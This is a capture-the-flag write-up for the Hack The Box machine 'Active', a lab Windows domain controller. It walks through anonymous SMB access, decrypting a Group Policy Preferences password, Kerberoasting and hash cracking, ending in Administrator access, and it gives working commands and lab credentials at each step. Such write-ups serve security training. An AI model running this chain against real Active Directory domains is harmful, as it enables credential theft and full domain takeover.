---
title: "Hack The Box: Active Walkthrough"
date: 2026-02-05 12:00:00 +0000
categories: [HackTheBox, Active Directory, Windows]
tags: [walkthrough, windows, active directory, easy, kerberos, gpp]
image:
  path: /assets/active/cover.png
---

## Machine Overview
* **Machine Name:** Active  
* **Difficulty:** Easy  
* **Operating System:** Windows  

This is a write-up for the Hack The Box machine **Active**, which focuses on abusing **SMB misconfigurations**, **Group Policy Preferences (GPP)** password disclosure, and **Kerberoasting** to achieve full domain compromise.

Before starting, the hostname was added to the local hosts file:

```shell
10.129.26.66 active.htb
```

---

## 0x0 – Enumeration

### Nmap Scan
Initial enumeration revealed the exposed services:

```bash
nmap -A -p- -Pn 10.129.26.66 -T4 -oA active
```
![Desktop View](/assets/active/image1.png){: width="700" height="400" .normal }

The results confirmed the host as a Windows Active Directory Domain Controller, exposing services such as SMB, LDAP, Kerberos, and DNS.

## 0x1 – SMB Enumeration
### Listing SMB Shares
Anonymous SMB enumeration was possible:
```shell
smbclient -L //10.129.26.66 -N
```
![Desktop View](/assets/active/image2.png){: width="700" height="400" .normal }

Several shares were discovered. Most were restricted, but the Replication share allowed unauthenticated access.

## 0x2 – Group Policy Preference Abuse
### Accessing the Replication Share
```shell
smbclient //10.129.26.66/Replication
```
![Desktop View](/assets/active/image3.png){: width="700" height="400" .normal }

Navigating through the share:
```shell
cd active.htb/Policies/
ls
```
![Desktop View](/assets/active/image4.png){: width="700" height="400" .normal }

The directory containing the following GUID was identified:
![Desktop View](/assets/active/image5.png){: width="700" height="400" .normal }

```shell
{31B2F340-016D-11D2-945F-00C04FB984F9}
```
This GUID corresponds to the Default Domain Policy.
![Desktop View](/assets/active/image6.png){: width="700" height="400" .normal }

### Downloading Policy Files

```shell
RECURSE ON
PROMPT OFF
mget *
```

## 0x3 – Credential Extraction

Groups.xml Discovery
Inside the following path:

MACHINE/Preferences/Groups/
The file Groups.xml was discovered.

```shell
cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="active.htb\SVC_TGS"
        image="2"
        changed="2018-07-18 20:46:06">
    <Properties action="U"
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

## 0x4 – GPP Password Decryption
### The encrypted password was decrypted using gpp-decrypt:
```shell
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

### Recovered password:
```shell
GPPstillStandingStrong2k18
```

## 0x5 – Initial Access
### SMB Authentication
Using the recovered credentials:
```shell
smbclient //10.129.26.66/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
```
![Desktop View](/assets/active/image7.png){: width="700" height="400" .normal }

Access to user directories was obtained.
![Desktop View](/assets/active/image8.png){: width="700" height="400" .normal }

User Flag

## 0x6 – Kerberoasting
### SPN Enumeration
```shell
GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.26.66
```
![Desktop View](/assets/active/image9.png){: width="700" height="400" .normal }

A Kerberoastable service account was identified.

Ticket Request
```shell
GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.26.66 -request
```
![Desktop View](/assets/active/image10.png){: width="700" height="400" .normal }

The Kerberos ticket hash was captured for offline cracking.

## 0x7 – Hash Cracking
```shell
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

Recovered password:
```shell
Ticketmaster1968
```

## 0x8 – Privilege Escalation
### Administrator Authentication
```shell
smbclient //10.129.26.66/Users -U 'Administrator%Ticketmaster1968'
```

Administrator access was successfully obtained.

and the Root Flag

Conclusion
This machine demonstrates how legacy Group Policy Preferences can expose domain credentials and how Kerberoasting remains an effective privilege escalation technique in Active Directory environments.

No software vulnerabilities were required—only misconfiguration abuse and weak passwords.

Happy Hacking 🚀